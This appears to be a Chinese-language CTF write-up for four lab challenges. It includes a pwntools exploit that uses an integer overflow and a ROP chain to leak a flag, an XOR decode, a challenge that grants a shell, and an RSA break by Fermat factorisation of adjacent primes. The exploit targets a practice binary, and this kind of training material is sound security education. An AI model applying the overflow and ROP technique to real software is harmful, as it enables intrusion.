# wp

## checkin

整数溢出，泄露flag

```python
from pwn import *
import sys
import os
import os.path
code = ELF("./checkin")
context.arch=code.arch
context.os='linux'
context.terminal = ['tmux','splitw','-h']

if len(sys.argv) == 3:
    DEBUG = 0
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    p = remote(HOST, PORT)
elif len(sys.argv) == 1:
    print ("Welcome to  c0ke's simplified pwntools template!!!")
    print ("Usage : \n")
    print ("     1. python mode.py HOST PORT\n ") 
    print ("     2. python mode.py PATH\n")
    exit()
else:
    DEBUG = 1
    if len(sys.argv) == 2:
        PATH = sys.argv[1]
        p = process(PATH)

    
def debug():#debug
    gdb.attach(proc.pidof(p)[0],gdbscript="b  main")
    pause()
    
flag_bss  = 0x6010C0
puts_plt = 0x4006B0
main_addr = 0x400938
pl =  b'a'*0x50+b'x'*0x8 + p64(puts_plt) +p64(main_addr)+ p64(flag_bss)

p.sendlineafter("name: \n",'kali')
p.sendlineafter("Please input size: \n","\t-32")
p.sendline(pl)
p.interactive()
	
```

## 疑惑（异或）

异或一下就好了

```python
key1 = ['w','e','l','c','o','m','e','_','t','o','_','n','i','n','e','-','a','k','_','m','a','t','c','h','_','i','s','_','s','o','_','e','a','s','y','_','!','@','!']
key2 = [20,4,24,5,94,12,2,36,26,6,49,11,68,15,14,114,12,10,43,14,9,43,10,27,31,31,22,45,10,48,58,4,18,10,38,31,14,97,92]

print(len(key1))
print(len(key2))
flag = []
for i in range(39):
    flag.append(chr(ord(key1[i])^ord(chr(key2[i]))))
flag=''.join(flag)
print(flag)
```

## angr

自带shell

输入1 ，然后输入2.就获得了shell

cat flag即可

## easyrsa

先看题目：

~~~python
def nextPrime(n):
    n += 2 if n & 1 else 1
    while not isPrime(n):
        n += 2
    return n

p = getPrime(1024)
q = nextPrime(p)
n = p * q
e = 0x10001
d = inverse(e, (p-1) * (q-1))
c = pow(bytes_to_long(flag.encode()), e, n)
~~~

由题目p = getPrime(1024)和q = nextPrime(p)可得：p和q是相邻的两个大素数，可以使用费马分解大素数n（下面是代码）：

~~~python
def isqrt(n):
  x = n
  y = (x + n // x) // 2
  while y < x:
    x = y
    y = (x + n // x) // 2
  return x

def fermat(n, verbose=True):
    a = isqrt(n) # int(ceil(n**0.5))
    b2 = a*a - n
    b = isqrt(n) # int(b2**0.5)
    count = 0
    while b*b != b2:
        if verbose:
            print('Trying: a=%s b2=%s b=%s' % (a, b2, b))
        a = a + 1
        b2 = a*a - n
        b = isqrt(b2) # int(b2**0.5)
        count += 1
    p=a+b
    q=a-b
    assert n == p * q
    print('a=',a)
    print('b=',b)
    print('p=',p)
    print('q=',q)
    print('pq=',p*q)
    return p, q

n=13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109
fermat(n)
~~~

分解得到p和q：

~~~python
q=117123319508571660311580580801277877113258215841429600587756950705045059473605968354897102454036753352698271630058203802982435282995624979494332828978380786264504042406030779426255482928292116935288547705920337997660644513247195680353414889901462368164202774814849550617113594461044664436362334469679800084891
p=117123319508571660311580580801277877113258215841429600587756950705045059473605968354897102454036753352698271630058203802982435282995624979494332828978380786264504042406030779426255482928292116935288547705920337997660644513247195680353414889901462368164202774814849550617113594461044664436362334469679800085999

~~~

求解一般的RSA的做法：

~~~python
import gmpy2
from Crypto.Util.number import *

q=117123319508571660311580580801277877113258215841429600587756950705045059473605968354897102454036753352698271630058203802982435282995624979494332828978380786264504042406030779426255482928292116935288547705920337997660644513247195680353414889901462368164202774814849550617113594461044664436362334469679800084891
p=117123319508571660311580580801277877113258215841429600587756950705045059473605968354897102454036753352698271630058203802982435282995624979494332828978380786264504042406030779426255482928292116935288547705920337997660644513247195680353414889901462368164202774814849550617113594461044664436362334469679800085999
d=12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093
c=11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578
print(long_to_bytes(gmpy2.powmod(c,d,p*q)))
~~~

得到flag：b'flag{3895dfda-67b1-11ed-b784-b07b2568d266}'